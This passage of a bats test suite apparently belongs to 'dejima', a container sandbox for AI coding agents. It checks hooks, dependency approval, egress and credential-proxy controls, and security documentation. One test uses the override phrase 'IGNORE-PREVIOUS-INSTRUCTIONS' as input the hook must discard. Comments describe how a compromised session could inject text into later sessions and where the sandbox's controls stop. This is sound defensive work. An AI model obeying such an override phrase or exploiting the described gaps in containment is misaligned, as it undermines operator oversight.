    # [mounts] readonly entry naming it, and a ~/.claude symlink pointing
    # into it. What refuses them is asserted by running the launcher, in
    # config.bats ("refused when it names the approval store"). This test
    # is the cheap half and does not stand in for that one.
    grep -q '_refuse_guarded_mount' "$REPO_ROOT/bin/dejima"
}

@test "sandbox-context escapes a declared domain's dots before matching the servers file" {
    # $dom comes straight off a session-writable declaration and lands in a
    # grep BRE, where an unescaped "." matches any character: a project could
    # declare "aexample.com" and have the hook match the server= line for an
    # already-approved "a.example.com", reporting an unapproved domain as
    # allowed.
    #
    # That whole class of question went away with the probe: the hook now asks
    # the resolver whether the name answers, rather than pattern-matching a
    # configuration file. It had to, because that file is in the FILTER
    # container and the session cannot read it - so the grep found nothing and
    # every declared domain was reported missing, including ones the session
    # could plainly reach. What is left to pin is that it does not go back to
    # reading a file it has no access to.
    run grep -n 'dnsmasq\|servers.conf\|/run/egress-policy' "$REPO_ROOT/hooks/dejima-briefing-render.sh"
    [ "$status" -ne 0 ] \
        || { echo "the probe reads the filter container's files again:"; echo "$output"; return 1; }
    grep -q 'dig +short' "$REPO_ROOT/hooks/dejima-briefing-render.sh" \
        || { echo "nothing asks the resolver whether a declared domain is permitted"; return 1; }
    # Bounded, because an agent is waiting on this and one unanswered name
    # would otherwise spend dig's default 15s on its own.
    grep -qE 'dig \+short \+time=[0-9]+ \+tries=[0-9]+' "$REPO_ROOT/hooks/dejima-briefing-render.sh" \
        || { echo "the lookup is unbounded, so a slow name stalls the briefing"; return 1; }
}

@test "sandbox-context reads its stdin payload once" {
    # jq is called more than once now (session_id and cwd); reading stdin
    # twice would silently give the second call nothing.
    grep -q 'payload=$(cat)' "$REPO_ROOT/hooks/sandbox-context.sh"
    run grep -c "jq -r '\.session_id" "$REPO_ROOT/hooks/sandbox-context.sh"
    [ "$output" -eq 1 ]
}

@test "sandbox-context probes declared dependencies and never treats them as granted" {
    grep -q 'dpkg-query' "$REPO_ROOT/hooks/dejima-briefing-render.sh"
    grep -q 'npm ls -g' "$REPO_ROOT/hooks/dejima-briefing-render.sh"
    grep -q 'pip list' "$REPO_ROOT/hooks/dejima-briefing-render.sh"
    grep -q 'cargo install --list' "$REPO_ROOT/hooks/dejima-briefing-render.sh"
    # domains are checked against what this container actually resolves,
    # not against the host-side approval store it cannot see
    grep -q 'dig +short' "$REPO_ROOT/hooks/dejima-briefing-render.sh"
    grep -q 'dejima-project approve' "$REPO_ROOT/hooks/dejima-briefing-render.sh"
}

# The hook answers "is this installed?" per kind, and a tarball has no
# package manager to ask - it is there if its directory is. A tarball spec
# falling through to the package-name regex would be silently skipped, which
# reads to the agent as "declared and present" for something that is neither.
@test "sandbox-context reports a declared tarball dependency that is not unpacked" {
    local ws; ws="$(mktemp -d)"
    local sha=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
    mkdir -p "$ws/.dejima"
    printf 'tarball:definitely-not-here@%s:https://example.com/x.tar.gz\n' "$sha" > "$ws/.dejima/dependencies"
    local out
    out=$(printf '{"session_id":"s1","cwd":"%s"}' "$ws" | sandbox_context)
    rm -rf "$ws"
    [[ "$out" == *"definitely-not-here"* ]]
    # The digest reaches the agent intact: it is what the operator is being
    # asked to approve, so a truncated form would be asking them to agree to
    # something they cannot see.
    [[ "$out" == *"$sha"* ]]
}

# The positive half of the test above. It needs a tarball dependency actually
# unpacked in the image, which only exists once a project has approved one -
# so on an image with none it skips rather than silently asserting nothing.
# A visible skip is the honest form here; a test that arranged its own
# /opt/dejima entry would be checking that mkdir works.
#
# The branch itself is pinned by the source-level test below, which holds
# regardless of what this image happens to contain.
@test "sandbox-context does not report a tarball dependency that is unpacked" {
    local present=""
    for d in /opt/dejima/*/; do [ -d "$d" ] && present="$(basename "$d")" && break; done
    [ -n "$present" ] || skip "no unpacked tarball dependency in this image"
    local ws; ws="$(mktemp -d)"
    local sha=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
    mkdir -p "$ws/.dejima"
    printf 'tarball:%s@%s:https://example.com/x.tar.gz\n' "$present" "$sha" > "$ws/.dejima/dependencies"
    local out
    out=$(printf '{"session_id":"s1","cwd":"%s"}' "$ws" | sandbox_context)
    rm -rf "$ws"
    [[ "$out" != *"$present"* ]]
}

# runtime.bats proves the derived-image dependency mechanism works by
# declaring apt:cowsay and then finding cowsay installed. That only proves
# anything while the base image does not ship it - otherwise the assertion
# passes with the mechanism entirely broken. runtime.bats checks this for
# itself too, but only where Docker exists; this catches it in the suite that
# runs everywhere, at the point the package list changes.
@test "the base image ships none of the packages used as dependency fixtures" {
    for pkg in $(grep -oE "apt:[a-z0-9.+-]+" "$REPO_ROOT/test/runtime.bats" | cut -d: -f2 | sort -u); do
        run grep -nE "^ +$pkg \\\\$" "$SANDBOX_DIR/Dockerfile"
        [ "$status" -ne 0 ] || {
            echo "$pkg is a dependency-test fixture and is also in the base image" >&2
            false
        }
    done
}

# The image ships the sandbox's own machinery and the tooling with no route
# through dejima-dep. A language toolchain has a route - tarball: - so one
# appearing here means every project carries it with nobody having asked.
@test "no language toolchain is installed into the base image" {
    run grep -nE '^(RUN|ENV).*(golang|/usr/local/go|rustup|\.cargo/bin|pyenv|rbenv|sdkman)' \
        "$SANDBOX_DIR/Dockerfile"
    [ "$status" -ne 0 ] || {
        echo "declare it with dejima-dep instead:" >&2
        echo "$output" >&2
        false
    }
}

@test "sandbox-context decides a tarball is present by its unpack directory" {
    grep -q '\[ -d "/opt/dejima/\$name" \] && continue' "$REPO_ROOT/hooks/dejima-briefing-render.sh"
}

@test "sandbox-context reports nothing when no project declarations exist" {
    local ws; ws="$(mktemp -d)"
    local out
    out=$(printf '{"session_id":"s1","cwd":"%s"}' "$ws" | sandbox_context)
    rm -rf "$ws"
    [[ "$out" != *"declares requirements"* ]]
}

@test "sandbox-context still reports a declared dependency with no trailing newline" {
    # A while/read loop fed straight from the file drops a final line that
    # has no trailing newline - not a validation rejection, just never read.
    local ws; ws="$(mktemp -d)"
    mkdir -p "$ws/.dejima"
    printf 'apt:definitely-not-installed-noeol' > "$ws/.dejima/dependencies"
    local out
    out=$(printf '{"session_id":"s1","cwd":"%s"}' "$ws" | sandbox_context)
    rm -rf "$ws"
    [[ "$out" == *"definitely-not-installed-noeol"* ]]
}

@test "sandbox-context bounds a huge declaration file instead of emitting nothing" {
    # .dejima/ is on the read-write workspace mount, so a compromised
    # session can append to it at will. Unbounded, that used to push the
    # assembled context past Linux's 128 KiB MAX_ARG_STRLEN and make jq fail
    # outright - costing every later session in the project its entire
    # briefing (sandbox notice, worktree rule, never-push-to-main rule), and
    # destroying the very report that would have named the junk.
    local ws lab i; ws="$(mktemp -d)"
    mkdir -p "$ws/.dejima"
    lab="$(printf 'a%.0s' $(seq 1 62))"
    for i in $(seq 1 700); do printf 'x%03d.%s.%s.%s\n' "$i" "$lab" "$lab" "$lab"; done \
        > "$ws/.dejima/allowed-domains"
    local b; b="$(mktemp)"
    printf 'dejima Docker container\n' > "$b"
    local out
    out=$(printf '{"session_id":"s1","cwd":"%s"}' "$ws" \
        | sandbox_context DEJIMA_BRIEFING_FILE="$b")
    rm -rf "$ws"; rm -f "$b"
    printf '%s' "$out" | jq -e '.hookSpecificOutput.additionalContext' >/dev/null
    [[ "$out" == *"dejima Docker container"* ]]
    # 700 declared, 200 considered (the cap read_declared applies host-side),
    # 20 of those named and the remaining 180 only counted. Both caps have to
    # hold for this exact number to appear.
    [[ "$out" == *"(+180 more)"* ]]
    [ "$(printf '%s' "$out" | wc -c)" -lt 16000 ]
    # The context must not travel as a single argv element even so - staying
    # just inside a limit is not the same as not having one.
    run grep -n 'jq -n --arg context' "$REPO_ROOT/hooks/sandbox-context.sh"
    [ "$status" -ne 0 ]
}

@test "sandbox-context probes each ecosystem once, not once per declared entry" {
    # An `npm ls -g` fork costs about a second, so one per declared entry
    # would run 200 of them at the cap - past Claude Code's hook timeout,
    # which drops the injected context just as completely as a jq failure.
    local ws stub i; ws="$(mktemp -d)"; stub="$(mktemp -d)"
    mkdir -p "$ws/.dejima"
    for i in $(seq 1 50); do echo "npm:nosuchpkg$i"; done > "$ws/.dejima/dependencies"
    cat > "$stub/npm" <<EOF
#!/bin/sh
echo call >> "$stub/calls"
exit 1
EOF
    chmod +x "$stub/npm"
    local out
    out=$(printf '{"session_id":"s1","cwd":"%s"}' "$ws" \
        | sandbox_context PATH="$stub:$PATH")
    local calls; calls=$(wc -l < "$stub/calls")
    rm -rf "$ws" "$stub"
    [ "$calls" -eq 1 ]
    [[ "$out" == *"nosuchpkg1"* ]]
}

@test "sandbox-context ignores a dotless declared domain instead of echoing it verbatim" {
    # A bare word is not a domain this hook could ever be reporting on, so
    # accepting one only lets a session put arbitrary text into the next
    # session's context under a heading that reads as the project speaking.
    local ws; ws="$(mktemp -d)"
    mkdir -p "$ws/.dejima"
    printf 'IGNORE-PREVIOUS-INSTRUCTIONS\nreal.example.com\n' > "$ws/.dejima/allowed-domains"
    local out
    out=$(printf '{"session_id":"s1","cwd":"%s"}' "$ws" | sandbox_context)
    rm -rf "$ws"
    [[ "$out" != *"IGNORE-PREVIOUS-INSTRUCTIONS"* ]]
    [[ "$out" == *"real.example.com"* ]]
}

@test "install.sh links the per-project CLIs alongside the existing ones" {
    grep -qx 'link_bin dejima-dep' "$REPO_ROOT/install.sh"
    grep -qx 'link_bin dejima-project' "$REPO_ROOT/install.sh"
}

@test "install.sh puts the share CLI on PATH" {
    # bin/dejima's launch notice tells the operator to run `dejima-share
    # adopt` by name, and now that ~/shared is one directory per project,
    # "where do I put a file for the next session" has no other answer.
    grep -qx 'link_bin dejima-share' "$REPO_ROOT/install.sh"
}

@test "the docs say what happened to files left in share_dir's top level" {
    # share_dir used to be mounted whole. Splitting it per project stops a
    # file that was handed to a session yesterday from arriving today, and a
    # behaviour change that makes something silently not happen is the one
    # that has to be written down rather than discovered.
    local flat
    flat="$(flat_prose "$REPO_ROOT/docs/configuration.md")"
    grep -q 'dejima-share adopt' <<< "$flat" \
        || { echo "nothing tells the reader how to move them"; return 1; }
    grep -q 'mounted into nothing' <<< "$flat" \
        || { echo "the doc does not say those files stopped being mounted"; return 1; }
    # The retention story, which is that there isn't one: dejima removes
    # nothing from share_dir and never has.
    grep -qi 'Nothing prunes' <<< "$flat" \
        || { echo "the doc no longer says share_dir grows until you clear it"; return 1; }
}

@test "install.sh puts the exit-time audit CLI on PATH" {
    # bin/dejima's own startup warning tells the operator to run
    # `dejima-audit ack ...` by name; that instruction is only true if the
    # installer links it like every other user-facing CLI here.
    grep -qx 'link_bin dejima-audit' "$REPO_ROOT/install.sh"
}

@test "README documents the declaration/approval split" {
    grep -q '\.dejima/' "$REPO_ROOT/README.md"
    grep -q 'dejima-project approve' "$REPO_ROOT/README.md"
    grep -q 'dejima-dep' "$REPO_ROOT/README.md"
}

@test "README no longer documents the removed config/env flow" {
    run grep -n 'config/env\|dejima-env' "$REPO_ROOT/README.md"
    [ "$status" -ne 0 ]
}

@test "README documents dejima-dep --global" {
    grep -q 'dejima-dep add --global cargo:cargo-nextest' "$REPO_ROOT/README.md"
}

@test "README documents that the exit-time audit's findings are not attributed to the session" {
    # Presence-only grep - it confirms the caveat sentence exists in the
    # Security notes teaser, not that the linked docs/security.md
    # explanation it points readers to is itself correct or complete.
    flat_prose "$REPO_ROOT/README.md" | grep -q 'not a verdict on who caused them'
}

# Was: that the cross-session false-positive case is documented. The finding
# itself is gone - a session can no longer write another project's slug, so
# every one it could still see belonged to some other session - and what
# needs documenting now is its absence, so that removing detection stays a
# stated decision rather than something a reader has to infer from silence.
@test "the credential proxy is documented under its own heading" {
    # It sits under its own heading rather than as a bullet inside the
    # 500-line "The exit-time audit" section, which is not where anyone looks
    # for how the model credential is kept out of the container.
    local sec
    sec="$(sed -n '/^## The model API credential/,/^## /p' "$REPO_ROOT/docs/security.md")"
    grep -q 'dejima-credential-proxy' <<< "$sec" \
        || { echo "the proxy is not documented under its own heading"; return 1; }
    sec="$(sed -n '/^## The exit-time audit/,/^## /p' "$REPO_ROOT/docs/security.md")"
    run grep -c 'dejima-credential-proxy' <<< "$sec"
    [ "$output" -eq 0 ] || { echo "the audit section has absorbed the proxy again"; return 1; }
}

# The absence of a finding needs documenting as much as a finding does, so
# that not detecting something stays a stated decision rather than something
# a reader has to infer from silence.
@test "docs/security.md does not describe the fallthrough the launch refuses" {
    # Caught by a release pass, not by a test: bin/dejima made an unproxied
    # credential a refusal, and the arrangements table went on listing it as
    # the fourth row - the one where the real credential is mounted. A
    # document promising the weakest posture for a launch that no longer
    # happens is worse than one that says nothing, because it is the posture
    # an operator plans around.
    local doc="$REPO_ROOT/docs/security.md" row
    row="$(grep -m1 '^| \*\*No proxy\*\*' "$doc")" \
        || { echo "the arrangements table has no 'No proxy' row"; return 1; }
    [[ "$row" == *"proxy = off"* ]] \
        || { echo "the row does not name what puts a launch in it: $row"; return 1; }
    [[ "$row" != *"cannot serve"* ]] \
        || { echo "the row still claims an unservable credential is mounted: $row"; return 1; }

    # And the refusal is the code's, so the two cannot drift apart silently.
    grep -q "cannot serve the credential in" "$REPO_ROOT/bin/dejima" \
        || { echo "bin/dejima no longer refuses it - the doc above is now wrong"; return 1; }
    grep -q 'refusal' <<< "$(sed -n '/^\*\*Only .proxy = off. lands/,/^$/p' "$doc")" \
        || { echo "the doc does not say what happens instead"; return 1; }
}

@test "docs/security.md says why there is no cross-project finding" {
    grep -q 'deliberately no .CROSS-PROJECT. finding' "$REPO_ROOT/docs/security.md"
    run grep -n 'CROSS-PROJECT history/memory write' "$REPO_ROOT/bin/dejima-audit"
    [ "$status" -ne 0 ] || { echo "the finding is back but the doc says it is gone" >&2; false; }
}

# The CI disclosure is the one part of issue #72 that helps a reader whatever
# else is or isn't mitigated on their runners, so it is pinned in all three
# places rather than left to survive a future edit on its own. Presence-only
# greps, same caveat as the two above.
@test "the port-22 claim names both properties it rests on" {
    # "GitHub's ranges are allowlisted on port 443 only, so port 22 is
    # physically unreachable" is an IPv4 statement. The allowlist decides what
    # is reachable over v4; what makes port 22 unreachable AT ALL is that the
    # container blocks IPv6 as well, since an allowlist naming one address
    # family says nothing about the other.
    #
    # The claim is true. The risk is that it stays readable if either property
    # quietly stops holding - which is what a reader cannot check and what a
    # future change would not trip over.
    #
    # Found by the reciprocal of it: dejima-ci-hardener made the same claim,
    # about dejima's behaviour, naming one half. They found theirs after this
    # side pointed at the wrong document, and this side had it too.
    # Flattened and stripped of emphasis before every match, without
    # exception. Assertions on prose fail on a line break otherwise, which has
    # cost four separate debugging detours in this suite - including one in
    # this very test, where the loop flattened and the check after it did not.
    local f flat readme
    for f in README.md docs/providers.md; do
        flat="$(tr '\n' ' ' < "$REPO_ROOT/$f" | tr -d '*`')"
        grep -q 'port 22' <<< "$flat" || continue
        grep -qiE 'IPv6' <<< "$flat" \
            || { echo "$f argues about port 22 without naming the IPv6 half"; return 1; }
    done
    # And the half that holds it up says how it is held, not just that it is.
    # That used to be a fail-closed branch - the firewall had to work out
    # whether the family was present before it could block it, and refused to
    # start when it could not. There is no such branch now: the refusal loads
    # in the same transaction as the rest of the ruleset, and the policy checks
    # the result rather than assuming it. Either formulation satisfies this;
    # an unsupported assertion does not.
    readme="$(tr '\n' ' ' < "$REPO_ROOT/README.md" | tr -d '*`')"
    grep -qE 'checks at startup|refuses to start' <<< "$readme" \
        || { echo "the README asserts the IPv6 half without saying what enforces it"; return 1; }
}

@test "README and docs/security.md both disclose that push access is CI code execution" {
    for f in README.md docs/security.md; do
        grep -q 'push access is code execution elsewhere' "$REPO_ROOT/$f"
        grep -qi 'forge = none' "$REPO_ROOT/$f"
    done
}

# The egress allowlist is the control this repository leans on hardest in
# prose - it is named as what bounds where a prompt injection could fetch its
# next instruction from. That is true of what the container fetches and not of
# a harness tool executed elsewhere, so both documents have to keep saying so.
# A reader who takes the allowlist as the boundary and is not corrected has
# been misled by us, not by the harness.
@test "both documents say the egress allowlist does not bound a harness's own tools" {
    local sec="$REPO_ROOT/docs/security.md" tm="$REPO_ROOT/docs/threat-model.md"
    grep -q 'The firewall bounds the container, not the harness' "$sec" \
        || { echo "security.md drops the limit of the allowlist"; return 1; }
    # The evidence, not just the assertion: a reader has to be able to see why
    # this is a fact about the setup rather than a worry about it.
    grep -q 'Could not resolve host: aider.chat' "$sec" \
        || { echo "security.md asserts it without the observation behind it"; return 1; }
    grep -q 'egress allowlist bounds what reaches the model' "$tm" \
        || { echo "the threat model does not disclaim it"; return 1; }
    # And that it is framed per harness rather than as one harness's quirk,
    # since the next harness has to be asked the same question.
    grep -q 'per-harness question' "$tm" \
        || { echo "the threat model reads as a Claude Code quirk"; return 1; }
}

@test "remote access says the push has to leave the host" {
    # dejima-notify-watch runs on the HOST, so the container's allowlist has
    # nothing to do with whether it can reach an ntfy server. On a machine
    # behind an egress filter it does not control - a devbox on a hypervisor -
    # the push is dropped and every symptom points somewhere else: the config
    # is correct, the unit is healthy, nothing errors, the phone is silent.
    #
    # Raised from the dejima-devbox-hardener side, where an operator hit it and
    # fixed it by hand before either project documented it. Stated in general
    # terms rather than naming that runbook, since it is true of any host
    # behind a filter and a sibling's rule would go stale here.
    local doc="$REPO_ROOT/docs/remote-access.md" flat
    # Newlines flattened and emphasis stripped: the claims below are sentences,
    # and one that happens to wrap, or to carry a `**`, would otherwise fail a
    # grep for reasons that have nothing to do with what it says. Two of these
    # did exactly that on the first run.
    flat="$(flat_prose "$doc")"
    grep -q 'behind a firewall it does not control' <<< "$flat" \
        || { echo "the outbound requirement is unstated again"; return 1; }
    grep -q 'runs on the host, not in the container' <<< "$flat" \
        || { echo "nothing says which side of the boundary the watcher is on"; return 1; }
    # And in the walk, which is where someone with a silent phone actually is.
    local walk
    walk="$(sed -n '/^\*\*When no notification arrives/,/^## /p' "$doc")"
    grep -q 'reach the ntfy server at all' <<< "$walk" \
        || { echo "the troubleshooting walk has no step for it"; return 1; }
    # The walk counts itself, and a step added without the count is a document
    # arguing with itself in front of the reader.
    local claimed steps
    claimed="$(grep -oE '^\*\*When no notification arrives\.\*\* [A-Za-z]+' "$doc" | awk '{print $NF}')"
    steps="$(grep -cE '^[0-9]+\. \*\*' <<< "$walk")"
    case "$claimed:$steps" in
        Five:5|Six:6|Seven:7|Eight:8) ;;
        *) echo "the walk says '$claimed' and has $steps steps"; return 1 ;;
    esac
}

@test "remote access says where the notification guarantee stops" {
    # The page argues carefully that no sandbox-controlled bytes reach the
    # phone, and that argument is about the CONTAINER boundary. ntfy_url is a
    # credential for a channel the phone trusts, in a file on the host, and
    # anyone with the operator's account can publish to it, drown it, or read
    # it. None of that goes through the sandbox.
    #
    # It matters downstream: a monitoring design for these machines uses a
    # separate topic whose credential is deliberately not on the box, so a
    # compromised host cannot forge alerts about itself. That only works if
    # the reader knows the box's own topic is not privileged.
    local flat
    flat="$(flat_prose "$REPO_ROOT/docs/remote-access.md")"
    grep -q 'Where that guarantee stops' <<< "$flat" \
        || { echo "the guarantee still reads as unbounded"; return 1; }
    grep -qi 'separate topic' <<< "$flat" \
        || { echo "nothing tells the reader to scope a second topic"; return 1; }
    grep -qi 'forge alerts about itself' <<< "$flat" \
        || { echo "the reason for the second topic is gone"; return 1; }
}

@test "the sshfs recipe sends the reader to the right key and the right path" {
    # Two things a reader gets wrong on their own, one of them dangerously.
    #
    # The dangerous one: sshfs against the front-door key fails, because
    # command= replaces a subsystem request too, and the obvious fix is to
    # relax the forced command - which turns a key that is safe to leave on a
    # phone into a general shell key. The doc has to say use the ordinary key
    # BEFORE a reader reaches for the other repair.
    #
    # The merely wasteful one: ~/shared is the container's view. On the host
    # it is share_dir, which is not named shared, so `sshfs box:shared` mounts
    # nothing and looks like a permissions problem.
    local flat
    flat="$(flat_prose "$REPO_ROOT/docs/remote-access.md")"
    grep -qi 'subsystem sftp request is not an exception' <<< "$flat" \
        || { echo "nothing says why the front-door key fails here"; return 1; }
    grep -qi 'Do not relax that key' <<< "$flat" \
        || { echo "the doc no longer heads off loosening the forced command"; return 1; }
    grep -q 'print-config | grep share_dir' <<< "$flat" \
        || { echo "the reader is not told how to find the host path"; return 1; }

    grep -q '^### On login' "$REPO_ROOT/docs/remote-access.md" \
        || { echo "the automatic route is undocumented"; return 1; }
}

@test "the sshfs section hands out no fstab line" {
    # Deliberately omitted, and the omission is stated rather than left as a
    # gap someone helpfully fills. An fstab mount runs as root: a key root can
    # read, root's ssh config rather than yours, and allow_other before your
    # own account can see inside - which then lets every account on the machine
    # in. Worse in every direction than typing sshfs, on a mount whose whole
    # cost is that it is present when you did not ask.
    local doc="$REPO_ROOT/docs/remote-access.md" sec
    sec="$(sed -n "/^## Mounting the box's files/,\$p" "$doc")"
    grep -qE 'fuse\.sshfs|x-systemd\.automount|allow_other,' <<< "$sec" \
        && { echo "an fstab line is back in the section"; return 1; }
    grep -q 'deliberately no /etc/fstab line' <<< "$(flat_prose "$doc")" \
        || { echo "nothing says the omission is a decision"; return 1; }
}

@test "what an sshfs mount costs is disclosed before the recipe, not after it" {
    # A mount looks like plumbing, so the cost has to arrive before the reader
    # has already pasted the command. Ordering is the assertion: this started
    # as a closing note, which is precisely where nobody reads it.
    local doc="$REPO_ROOT/docs/remote-access.md" cost setup
    cost="$(grep -n '^### What mounting it costs you' "$doc" | cut -d: -f1)"
    setup="$(grep -n '^### Setting it up' "$doc" | cut -d: -f1)"
    [ -n "$cost" ] && [ -n "$setup" ] \
        || { echo "the cost and setup sections are not both there"; return 1; }
    [ "$cost" -lt "$setup" ] \
        || { echo "the cost section sits after the recipe again"; return 1; }

    # The surface itself. Each of these is a distinct way session-authored
    # bytes act on the operator's machine, and each was arrived at separately;
    # a rewrite that keeps the heading and drops one of them keeps the shape
    # of the disclosure without its content.
    local claim
    for claim in \
        'nothing carries the sanitising there' \
        'Mounting removes the deciding' \
        'a desktop renders names' \
        'as a project is code execution' \
        'read-write, and your desktop uses that' \
        'Symlinks resolve on your machine' \
        'does not add is a route inward' \
        'unmounting is the biggest lever'
    do
        grep -qi -- "$claim" < <(flat_prose "$doc") \
            || { echo "the disclosure no longer says: $claim"; return 1; }
    done
}

@test "the threat model owns the handoff-directory surface as a case of item 5" {
    # share_dir and [mounts] read_write carry session-authored bytes and names
    # out of the container by design, and the threat model said nothing about
    # them. It belongs under item 5 - the operator's own side of the handoff -
    # rather than as a new row, because the session initiates none of it.
    #
    # What makes it worth stating is the delta from item 5, whose closing
    # sentence is that a person decides: a mounted directory is opened by an
    # indexer or a previewer with no decision per file at all.
    local flat
    flat="$(flat_prose "$REPO_ROOT/docs/threat-model.md")"
    grep -qi 'handoff directories are item 5 with the person taken out' <<< "$flat" \
        || { echo "the mount case is not tied to item 5"; return 1; }
    grep -qi 'here nobody does' <<< "$flat" \
        || { echo "the delta from item 5 - that no person decides - is gone"; return 1; }
    grep -qi 'the session initiates none of it' <<< "$flat" \
        || { echo "nothing bounds this as not being a route inward"; return 1; }
    # And in the list a reader checks for what they are on their own for.
    grep -qi 'safe for another machine to open' <<< "$flat" \
        || { echo "the not-claimed list does not carry it"; return 1; }
}

@test "the negative space is collected where a reader will find it" {
    # A document organised by control makes a reader assemble what is NOT
    # covered themselves, and most will not. Every item here is documented
    # somewhere else too; this holds the collected list, at the top, because
    # the collection is the part that is easy to lose.
    local sec="$REPO_ROOT/docs/security.md" claim
    grep -q '^## What dejima does not sandbox' "$sec" \
        || { echo "the not-sandboxed list is gone"; return 1; }
    for claim in 'through a domain that is allowed' 'DNS query names' \
                 'below the container' 'finer than a session' \
                 'Resource exhaustion'; do
        grep -qi "$claim" "$sec" || { echo "the list drops: $claim"; return 1; }
    done
    # First, not buried: a list of what is not covered is only useful before
    # the reader has formed an impression from the list of what is.
    local not_line blast_line
    not_line="$(grep -n '^## What dejima does not sandbox' "$sec" | cut -d: -f1)"
    blast_line="$(grep -n '^## Blast radius by layer' "$sec" | cut -d: -f1)"
    [ "$not_line" -lt "$blast_line" ] \
        || { echo "the not-sandboxed list sits below the controls"; return 1; }
}

@test "the absence of timeouts is a stated decision, not a gap" {
    # Every published checklist for this lists them. dejima does not have them
    # and the reason is a judgement about what dejima protects - so it is
    # written where the absence is, or it reads as something not yet reached.
    local sec="$REPO_ROOT/docs/security.md"
    grep -q '^## Why there are no timeouts' "$sec" \
        || { echo "the reasoning is gone but the absence is not"; return 1; }
    grep -qi 'does not cross the boundary' "$sec" \
        || { echo "the reason no longer says what a runaway session does not do"; return 1; }
    # And the claim stays true: adding a limit without revisiting this would
    # leave the document arguing against something the code now does.
    run grep -nE '^\s*(mem_limit|cpus|pids_limit|stop_grace_period):' \
        "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ] \
        || { echo "a resource limit exists while the doc says none does:"; echo "$output"; return 1; }
}

@test "the threat model says which deployment it describes" {
    # The table has rows below the container whose controls belong to another
    # repository. Run without it - on a laptop, which the README invites - the
    # row below the container is the operator's own machine. The table cannot
    # show that, so the prose has to say it.
    local tm="$REPO_ROOT/docs/threat-model.md"
    grep -q '^## Which deployment this describes' "$tm" \
        || { echo "the deployment the table describes is unstated again"; return 1; }
    grep -qi 'load-bearing' "$tm" \
        || { echo "the sister project reads as optional"; return 1; }
    grep -q 'devbox-hardener' "$tm" || { echo "$tm names no VM layer"; return 1; }
    # Linked from the not-sandboxed list, which is where a reader hits the
    # question first.
    grep -q 'which-deployment-this-describes' "$REPO_ROOT/docs/security.md" \
        || { echo "the not-sandboxed list does not point at the explanation"; return 1; }
}

@test "the microVM answer concedes the field's ordering rather than disputing it" {
    # The most frequently asked question about this project, and the one whose
    # answer is easiest to rewrite into something weaker than it should be. A
    # revision that starts claiming a container is as strong a primitive as a
    # per-workload VM kernel is the failure mode, because it turns a statement
    # about where effort went into a statement about isolation that is not
    # true. Pin the concession, not the prose around it.
    local tm="$REPO_ROOT/docs/threat-model.md" flat
    grep -q '^## Why a container, and not a microVM' "$tm" \
        || { echo "the microVM question is unanswered again"; return 1; }
    flat="$(flat_prose "$tm")"
    grep -q "field's ordering is not in dispute" <<< "$flat" \
        || { echo "the section no longer concedes that a VM is the stronger boundary"; return 1; }
    # Named, because "why not a VM" is three different questions and answering
    # one of them reads as answering all three.
    local name
    for name in gVisor Firecracker Kata; do
        grep -q "$name" <<< "$flat" || { echo "the answer does not mention $name"; return 1; }
    done
    # The falsifiable half. Without it this is a position rather than a claim.
    grep -q 'What would change the answer' "$tm" \
        || { echo "nothing says what would overturn this"; return 1; }
    # Reached from the research agenda, which is what re-asks it.
    grep -q 'why-a-container-and-not-a-microvm' "$REPO_ROOT/docs/research-review.md" \
        || { echo "the standing question does not point at the written answer"; return 1; }
    # And from the stack section of the README, which is where someone holding
    # the question is standing when it occurs to them. An answer nobody finds
    # gets asked as a question instead.
    grep -q 'why-a-container-and-not-a-microvm' "$REPO_ROOT/README.md" \
        || { echo "the README does not surface the answer where the question arises"; return 1; }
}

@test "the README lists the whole stack, so it is not a threat-model discovery" {
    # Someone deciding what to stand up reads the README and may never open
    # docs/threat-model.md at all. The detail belongs there and the list
    # belongs here, before Setup, so the question "what else would I run?" is
    # answered at first contact rather than found later.
    local rd="$REPO_ROOT/README.md" flat
    flat="$(flat_prose "$rd")"
    grep -q '^## The dejima stack' "$rd" \
        || { echo "the README no longer lists the stack"; return 1; }
    # Before Setup: a list of components after the install steps is a list
    # read by someone who has already decided.
    local stack setup
    stack=$(grep -n '^## The dejima stack' "$rd" | cut -d: -f1)
    setup=$(grep -n '^## Setup' "$rd" | cut -d: -f1)
    [ "$stack" -lt "$setup" ] \
        || { echo "the stack section sits after Setup"; return 1; }

    # Every piece, each linked where it is a project of its own.
    local rows piece
    rows="$(sed -n '/^| Piece | Runs on | What it adds |/,/^$/p' "$rd")"
    [ -n "$rows" ] || { echo "the README stack table is gone or lost a column"; return 1; }
    for piece in 'dejima-devbox-hardener' 'dejima-guard' 'dejima-ci-hardener' \
                 'any push service' 'any uptime monitor'; do
        grep -qF "$piece" <<< "$rows" \
            || { echo "the README stack table has no row for $piece"; return 1; }
    done
    for piece in dejima-devbox-hardener dejima-guard dejima-ci-hardener; do
        grep -qF "https://gitbox.branderson.io/dejima/$piece" <<< "$rows" \
            || { echo "$piece is named in the README but not linked"; return 1; }
    done

    # Only dejima is required, or the table reads as a shopping list.
    grep -qi 'Only the first row is required' <<< "$flat" \
        || { echo "the README makes the optional pieces read as required"; return 1; }

    # And out to the detail, at the section that holds it rather than at the
    # top of a long document.
    grep -q 'docs/threat-model.md#the-stack-and-what-each-piece-buys' "$rd" \
        || { echo "the README does not link the stack section of the threat model"; return 1; }
}

@test "the threat model lays out the whole stack and says what each piece buys" {
    # Three sister projects now, plus two categories that are not projects at
    # all. A reader deciding what to stand up needs the arrangement in one
    # place, and needs the "without it" column more than the "what it buys"
    # one - the reason to run a piece is what goes wrong when you do not.
    local tm="$REPO_ROOT/docs/threat-model.md" flat
    flat="$(flat_prose "$tm")"
    grep -q '^| Piece | Runs on | What it buys | Without it |' "$tm" \
        || { echo "the stack table is gone or lost a column"; return 1; }
    # Scoped to the table's own rows, not to the file. Every one of these
    # names appears in the prose below it as well, so a whole-file grep passes
    # against a table that lost the row - which is how the first version of
    # this test passed its own mutation.
    local rows piece
    rows="$(sed -n '/^| Piece | Runs on |/,/^$/p' "$tm")"
    for piece in 'dejima**' 'dejima-devbox-hardener' 'dejima-guard' 'dejima-ci-hardener' \
                 'third-party hosted CI' 'any push service' 'any uptime monitor'; do
        grep -qF "$piece" <<< "$rows" \
            || { echo "the stack table has no row for $piece"; return 1; }
    done
    # Only the first is required. A table of components reads as a shopping
    # list without that.
    grep -qi 'Only the first row is required' <<< "$flat" \
        || { echo "the optional pieces read as required"; return 1; }
    # The dead man's switch, which is the row most easily skipped and the one
    # that decides whether any of the watching is real.
